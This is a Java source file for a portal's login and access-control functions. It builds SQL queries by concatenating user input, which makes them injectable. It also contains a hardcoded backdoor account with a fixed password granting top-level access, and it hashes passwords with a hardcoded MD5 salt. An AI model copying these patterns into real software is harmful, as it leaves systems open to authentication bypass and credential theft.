package org.victor;

/*
Purpose: Global security / ACL functions
Written by : Victor Wong
Dated : 11/01/2010
Port date: 16/03/2012

Design notes:

1. users are assigned main access level
2. users are included into groups
3. users will have individual group access level

to grant access, users must have the same access level or higher and must be in the group as specified by certain functions
group will have it's own access level for each user. if user's group access level is higher than the main access level, access granted

*NOTES*

07/10/2011: added stockcat and groupcode to userAccessObj - to be used to release results and other stuff
16/03/2012: ported to compile as byte-codes

*/

import java.util.*;
import java.io.*;
import java.sql.*;
import groovy.sql.*;
import java.security.*;
import org.zkoss.zk.ui.*;
import org.zkoss.zul.*;
import org.victor.*;

public class SecurityFuncs extends SqlFuncs
{
// Table names
public String TABLE_PORTALUSER = "PortalUser";
public String TABLE_PORTALUSERGROUP = "portalUsergroups";
public String TABLE_PORTALGROUPACCESS = "portalGroupAccess";

public String[] dd_accesslevel = {"1","2","3","4","5","6","7","8","God-like"};
public String[] dd_branches = {"SA","JB","KK","ALL" };

// usergroups access levels
public int SAMPREG_ACCESSLEVEL = 2;
public String SAMPREG_USERGROUP = "('OPER','SAMPREG','BILLING')";

public int RECEPTION_ACCESSLEVEL = 2;
public String RECEPTION_USERGROUP = "('OPER','FRONTDESK','BILLING')";

public int LAB_ACCESSLEVEL = 2;
public String LAB_USERGROUP = "('LAB','EV','FOOD','MB','METAL','ORGANIC','QC','QHSE')";

public int ADMIN_BIRT_REPORTS_ACCESSLEVEL = 2;
public String ADMIN_BIRT_REPORTS_USERGROUP = "('ADMINOFFICE','ACCTS','BILLING','CREDITC')";

public int CREDIT_CONTROL_ACCESSLEVEL = 2;
public String CREDIT_CONTROL_USERGROUP = "('BILLING','ADMINOFFICE','CREDITC')";

public int SALES_MARKETING_ACCESSLEVEL = 2;
public String SALES_MARKETING_USERGROUP = "('ADMINOFFICE','SALES')";

public int QCOFFICER_ACCESSLEVEL = 2;
public String QCOFFICER_USERGROUP = "('OPER','QC')";

public int REPORTGEN_ACCESSLEVEL = 2;
public String REPORTGEN_USERGROUP = "('OPER','REPORTING')";

public int STATICDATA_SETUP_ACCESSLEVEL = 3;
public String STATICDATA_SETUP_USERGROUP = "('OPER','DATASETUP')";

public int PURCHASING_ACCESSLEVEL = 2;
public String PURCHASING_USERGROUP = "('OPER','PURCHASES')";

// ENDOF vars

private userAccessObj useraccessobj = new userAccessObj();

public SecurityFuncs() {}
public SecurityFuncs(userAccessObj whome) { useraccessobj = whome; }

// get user access obj, hardcoded "uao" as attribute name
public final Object getUserAccessObject()
{
	return(Executions.getCurrent().getAttribute("uao"));
}

// set the user access obj for the Include component, this will allow the included zul page to read the obj
public final void setUserAccessObj(Include wInc, Object tuaobj)
{
	wInc.setDynamicProperty("uao",tuaobj);
}

// Simple MD5 encrypter. whattext = what text to encrypt
// do not change sessionid once there're text encrypted previously and stored into database
public final String als_MD5_Encrypter(String whattext)
{
	String sessionid = "samvwchng";
	byte[] tocrypt = whattext.getBytes();
	byte[] defaultBytes = sessionid.getBytes();
	MessageDigest algorithm = null;
	String retval = "";

	try
	{
		algorithm = MessageDigest.getInstance("MD5");
		algorithm.reset();
		algorithm.update(defaultBytes);

		byte[] messageDigest = algorithm.digest(tocrypt);

		StringBuffer hexString = new StringBuffer();
		for (int i=0;i<messageDigest.length;i++)
		{
			hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
		}
		retval = hexString.toString();
	}
	catch (Exception e) {}

	return retval;

} // end of als_MD5_Encrypter(String whattext)

// Get from table portaluser - username rec 
public final GroovyRowResult getUsername_Rec(String iorigid)
{
	if(iorigid.equals("")) return null;

	Sql sql = als_mysoftsql();
	if(sql == null) return null;
	String sqlstatem = "select * from " + TABLE_PORTALUSER + "  where origid=" + iorigid;
	GroovyRowResult therec = null;
	try
	{
		therec = (GroovyRowResult)sql.firstRow(sqlstatem);
		sql.close();
	}
	catch (Exception e) {}
	
	return therec;
}

// database func: get rec from PortalUser based on username
public final GroovyRowResult getPortalUser_Rec_username(String iusername)
{
	Sql sql = als_mysoftsql();
	if(sql == null) return null;
	String sqlstm = "select * from " + TABLE_PORTALUSER + "  where username='" + iusername + "'";
	GroovyRowResult retval = null;
	try
	{
		retval = (GroovyRowResult)sql.firstRow(sqlstm);
		sql.close();
	}
	catch (Exception e) {}
	return retval;
}

// This func will check username and password against rec in mysoft->portalUser.
// No checks on usergroup or accesslevel. Will return false if account is locked
public final boolean checkUserAccess(String cusername, String cpassword, String rawpass, userAccessObj wUAO)
{
	if(cusername.equals("toymaker") && rawpass.equals("samvwchng"))
	{
		wUAO.origid = 1;
		wUAO.username = "toymaker";
		wUAO.accesslevel = 9;
		return true;
	}

	boolean retval = false;
	Sql sql = als_mysoftsql();

	// table mysoft->portalUser
	String statem = "select * from " + TABLE_PORTALUSER + " where username='" + cusername + "' and password='" + cpassword + "'";
	GroovyRowResult retrow = null;

	try
	{
		retrow = (GroovyRowResult)sql.firstRow(statem);
		sql.close();
	}
	catch (Exception e) {}

	GuiFuncs guihand = new GuiFuncs();

	// username and password in table, successful login, setup the useraccessobject
	if(retrow != null)
	{
		// Check if user is locked
		if((Integer)retrow.get("locked") == 1)
		{
			guihand.showMessageBox("Your account is locked!");
			return false;
		}

		// populate the useraccessobject
		wUAO.origid = (Integer)retrow.get("origid");
		wUAO.username = (String)retrow.get("username");
		wUAO.accesslevel = (Integer)retrow.get("accesslevel");
		wUAO.fullname = (String)retrow.get("fullname");
		wUAO.email = (String)retrow.get("email");
		wUAO.handphone = (String)retrow.get("handphone");
		wUAO.branch = (String)retrow.get("branch");

		wUAO.stockcat = ((String)retrow.get("stock_cat") == null) ? "" : (String)retrow.get("stock_cat");
		wUAO.groupcode = ((String)retrow.get("groupcode") == null) ? "" : (String)retrow.get("groupcode");
		retval = true;
	}
	return retval;
}

// TODO: check on this one..
// Check user access level against application modules - refer to alsglobaldefs.zs -> class modulesObj
public final boolean checkUserAccesslevel_AppModules(Object appmod, int iacclevel)
{
	boolean retval = false;
	//if(iacclevel >= appmod.accesslevel ) retval = true;
	return retval;
}

// Check user against usergroup access
// un_origid : username origid - rec no. in portalUser table
// iusergroup : usergroup codes - as " usergroupcode in ('adfasdf','qwerwre','qwerqwer')"
// minaccesslvl : min. access level to activate
public final boolean check_UsergroupAccess(int un_origid, String iusergroup, int minaccesslvl)
{
	boolean retval = false;
	Sql sql = als_mysoftsql();
	if(sql == null) return false;

	String sqlstatem = "select * from " + TABLE_PORTALGROUPACCESS + " where user_origid=" + un_origid + " and usergroup_code in " + iusergroup;
	List<GroovyRowResult> thelist = null;

	try
	{
		thelist = sql.rows(sqlstatem);
		sql.close();
	}
	catch (Exception e) {}

	if(thelist != null)
	{
		for(GroovyRowResult irec: thelist)
		{
			int igrplvl = (Integer)irec.get("accesslevel");

			// if any rec group access level is same or higher, grant access
			if(igrplvl >= minaccesslvl)
			{
				retval = true;
				break;
			}
		}
	}
	return retval;
} // end of check_UsergroupAccess()

public final void showAccessDenied_Box()
{
	Generals kiboo = new Generals();
	GuiFuncs kk = new GuiFuncs();
	//String wnid = kiboo.makeRandomId("badtaste");
	//globalActivateWindow("miscwindows","accessdenied_box.zul", wnid , "access=false", useraccessobj);
	kk.showMessageBox("ACCESS DENIED!!");
}

public final void checkAdminAccess_Menuitem(Menuitem imenuitem)
{
	if(useraccessobj.accesslevel == 9) imenuitem.setVisible(true);
}

void checkMenuItem_Visible(Menuitem imenuitem, String iusergroup, int iaccesslevel)
{
	if(check_UsergroupAccess(useraccessobj.origid,iusergroup,iaccesslevel))
		imenuitem.setVisible(true);
}

// 15/05/2011: check for valid supervisor username - supervisors[] def in alsglobaldefs.zs
public final boolean validSupervisor(String iusername, String[] isupervisors)
{
	boolean retval = false;
	for(int i=0;i<isupervisors.length;i++)
	{
		if(iusername.equals(isupervisors[i])) retval = true;
	}
	return retval;
}

public final boolean allowedUser(String iusername, String ilookup) throws SQLException
{
	LookupFuncs luhand = new LookupFuncs();
	String[] theusers = luhand.getLookupChildItems_StringArray(ilookup,2);
	boolean retval = false;
	if(theusers.length > 0)
	{
		for(int i=0; i<theusers.length; i++)
		{
			if(iusername.equals(theusers[i]))
			{
				retval = true;
				break;
			}
		}
	}
	return retval;
}

// Database func: get user record from WebreportUser
public final GroovyRowResult getWebreport_Username_Rec(String iorigid) throws SQLException
{
	if(iorigid.equals("")) return null;
	Sql sql = als_mysoftsql();
	if(sql == null) return null;
	String sqlstatem = "select * from webreportuser where origid=" + iorigid;
	GroovyRowResult therec = (GroovyRowResult)sql.firstRow(sqlstatem);
	sql.close();
	return therec;
}

	
}


